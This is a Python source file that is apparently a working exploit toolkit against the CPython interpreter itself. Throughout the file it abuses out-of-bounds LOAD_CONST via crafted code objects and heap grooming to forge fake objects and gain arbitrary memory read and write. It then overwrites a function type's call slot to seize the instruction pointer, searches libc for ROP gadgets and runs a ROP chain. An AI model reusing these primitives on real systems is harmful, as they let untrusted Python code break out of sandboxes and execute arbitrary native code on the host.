#import nothing

nullfunc = lambda: None

#from types import CodeType, FunctionType
CodeType = nullfunc.__code__.__class__
FunctionType = nullfunc.__class__


# Thanks @chilaxan
def sizeof(obj):
	return type(obj).__sizeof__(obj)


IS_PY2 = not 2/3
BYTES_HEADER_LEN = sizeof(b"")-1
TUPLE_HEADER_LEN = sizeof(())

INT64_MAX =  (1<<63)-1
INT32_MAX =  (1<<31)-1
INT32_MIN = -(1<<31)

if IS_PY2:
	def bytes(arr):
		if type(arr) is int:
			return "\0" * arr
		return str(bytearray(arr))

nogc = []  # things we want to keep a reference to, to prevent gc


def p64a(*n):
	return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]


# technically this can unpack an int of any size
# py2-compatible equivalent of int.from_bytes(n, "little")
def u64(buf):
	n = 0
	for c in reversed(buf):
		n <<= 8
		n += c
	return n


def addrof(obj):
	return id(obj)


def refbytes(data):
	# get the address of the internal buffer of a bytes object
	nogc.append(data) # unnecessary?
	return addrof(data) + BYTES_HEADER_LEN


def get_aligned_tuple_and_bytes(prefix):
	its_per_size = 4
	tuples = []
	byteses = []  # the plural of bytes is byteses, obviously
	for size in range(8, 64)[::-1]:
		tupletemplate = range(size)
		suffix =  b"A"*(size*8-len(prefix))
		for _ in range(its_per_size):
			tuples.append(tuple(tupletemplate))
			byteses.append(prefix + suffix)
	
	bestdist = 99999999999
	besttuple = None
	bestbytes = None
	pairs = [(t, b) for t in tuples for b in byteses]
	for t, b in pairs:
		dist = addrof(b)-addrof(t)
		if dist > 0 and dist < bestdist:
			bestdist = dist
			besttuple = t
			bestbytes = b
	
	if bestdist > 100000:
		raise Exception("Heap groom failed: Could not allocate bytes near enough to tuple", hex(bestdist))
	
	return(besttuple, bestbytes)


# generate a function that effectively does LOAD_CONST(n)
def load_n(n):
	return eval("lambda: list(%s) if None else %s" % (",".join(map(str, range(1, n))), n))


def replace_code_consts(codeobj, consts):
	# py3.8+
	if hasattr(codeobj, "replace"):
		return codeobj.replace(co_consts=consts)

	code_args = []
	argnames = CodeType.__doc__.split("(")[1].split("[")[0].split(",")
	for argname in argnames:
		argname = argname.strip()
		
		if argname == "codestring":
			argname = "code"
		
		if argname == "constants":
			code_args.append(consts)
		else:
			code_args.append(getattr(codeobj, "co_"+argname))

	return CodeType(*code_args)


def fakeobj_once(addr):
	fake_bytearray_ptr = bytes(p64a(addr))

	if IS_PY2: # pad to 8-byte multiple
		fake_bytearray_ptr = b"AAAA" + fake_bytearray_ptr

	nogc.append(fake_bytearray_ptr)  # if this bytearray gets freed, bad things might happen

	const_tuple, fake_bytearray_ref = get_aligned_tuple_and_bytes(fake_bytearray_ptr)

	nogc.append(fake_bytearray_ref)  # likewise

	const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
	fake_bytearray_ref_addr = refbytes(fake_bytearray_ref)

	if IS_PY2: # account for padding
		fake_bytearray_ref_addr += 4

	offset = (fake_bytearray_ref_addr - const_tuple_array_start) // 8

	assert(INT32_MIN <= offset <= INT32_MAX)

	loader_code = load_n(offset).__code__
	newcode = replace_code_consts(loader_code, const_tuple)

	makemagic = FunctionType(newcode, {})

	magic = makemagic()
	return magic

reusable_tuple = (None,)
reusable_bytearray = None
def fakeobj(addr):
	"""
	fakeobj_once() does a heap spray each time, which may fail probabilistically and/or OOM.
	so, we use it once to set up a more repeatable fakeobj primitive which we can
	cache and reuse for future fakeobj() invocations.

	reusable_bytearray is a fake bytearray that points into the first entry of
	reusable_tuple, allowing us to freely modify the object it points to.
	"""

	global reusable_bytearray
	if reusable_bytearray is None:
		# py3: https://github.com/python/cpython/blob/75c551974f74f7656fbb479b278e69c8200b4603/Include/cpython/bytearrayobject.h#L5-L12
		"""
		typedef struct _object PyObject;

		# real definition has lots of #ifdefs, but it's basically this
		struct _object {
			Py_ssize_t ob_refcnt;
			PyTypeObject *ob_type;
		}

		#define PyObject_VAR_HEAD      PyVarObject ob_base;

		typedef struct {
			PyObject ob_base;
			Py_ssize_t ob_size; /* Number of items in variable part */
		} PyVarObject;

		typedef struct {
			PyObject_VAR_HEAD
			Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
			char *ob_bytes;        /* Physical backing buffer */
			char *ob_start;        /* Logical start inside ob_bytes */
			Py_ssize_t ob_exports; /* How many buffer exports */
		} PyByteArrayObject;
		"""
		# py2: https://github.com/certik/python-2.7/blob/c360290c3c9e55fbd79d6ceacdfc7cd4f393c1eb/Include/bytearrayobject.h#L22-L28
		"""
		typedef struct {
			PyObject_VAR_HEAD
			/* XXX(nnorwitz): should ob_exports be Py_ssize_t? */
			int ob_exports; /* how many buffer exports */
			Py_ssize_t ob_alloc; /* How many bytes allocated */
			char *ob_bytes;
		} PyByteArrayObject;
		"""

		fake_bytearray = bytes(p64a(
			1,   # ob_refcnt
			addrof(bytearray),  # ob_type
			8,   #    ob_size
			0,   #    py2 ob_exports, py3 ob_alloc
			8+1, #    py2 ob_alloc, py3 ob_bytes
			addrof(reusable_tuple) + TUPLE_HEADER_LEN, # py2 ob_bytes, py3 ob_start
			0 # py3 ob_exports
		))
		nogc.append(fake_bytearray)  # important!!!
		reusable_bytearray = fakeobj_once(refbytes(fake_bytearray))

	# assume 64-bit ptrs
	reusable_bytearray[:8] = p64a(addr)

	res = reusable_tuple[0]
	nogc.append(res) # unnecessary?
	return res

mem = None # cache the result
def getmem():
	global mem
	if mem:
		return mem
	
	fake_bytearray = bytes(p64a(
		1,
		addrof(bytearray),
		INT64_MAX,
		0, 0, 0, 0
	))
	
	mem = fakeobj(refbytes(fake_bytearray))
	return mem


def setrip(addr, rsi=tuple(), rdx=dict()):
	# make a copy of the built-in function type object
	ft_addr = addrof(FunctionType)
	ft_len = sizeof(FunctionType)
	my_functype = getmem()[ft_addr:ft_addr+ft_len]

	# patch tp_call
	my_functype[16*8:16*8 + 8] = p64a(addr)
	
	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags (perhaps not necessary?)
	tp_flags = u64(my_functype[21*8 : 21*8 + 8])
	tp_flags &= ~(1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
	my_functype[21*8 : 21*8 + 8] = p64a(tp_flags)

	# get a pointer to our patched function type
	my_functype_ptr = refbytes(bytes(my_functype))

	# create an instance of our custom function object
	fake_funcobj = bytes(p64a(0xcafebabe-2, my_functype_ptr))
	fake_funcobj += bytes(sizeof(nullfunc))  # padding
	my_func_ptr = refbytes(fake_funcobj)
	my_func = fakeobj(my_func_ptr)

	# call it!
	return my_func(*rsi, **rdx)


gadgets = {}
def find_gadgets():
	global gadgets
	if gadgets:
		return gadgets
	
	gadget_patterns = {
		"ret": b"\xc3",
		"mov rsp, rdx; ret": b"\x48\x89\xd4\xc3",
		"pop rax; ret": b"\x58\xc3",
		"pop rbx; ret": b"\x5b\xc3",
		"pop rcx; ret": b"\x59\xc3",
		#"pop rdx; ret": b"\x5a\xc3",
		"pop rdx; pop rbx; ret": b"\x5a\x5b\xc3",
		"pop rsi; ret": b"\x5e\xc3",
		"pop rdi; ret": b"\x5f\xc3",
		#"pop r8; ret": b"\x41\x58\xc3",
		#"pop r9; ret": "\x41\x59\xc3",
		"syscall; ret": b"\x0f\x05\xc3",
	}
	
	libc_base = int([l for l in open("/proc/self/maps").read().split("\n") if "libc-" in l and "r-x" in l][0].split("-")[0], 16) # XXX: cheating!
	mem = getmem()
	
	print("[*] Performing gadget search")
	for name, pattern in gadget_patterns.items():
		addr = mem.index(pattern, libc_base)
		print("[+] 0x%016x -> %s" % (addr, repr(name)))
		gadgets[name] = addr
	
	return gadgets


def do_rop(payload):
	gadgets = find_gadgets()

	fakedict = fakeobj(refbytes(bytes(p64a(
		gadgets["pop rax; ret"] - 4,  # subtract 4 to offset refcounting
		addrof(dict)
	) + payload)))

	setrip(gadgets["mov rsp, rdx; ret"], rdx=fakedict)
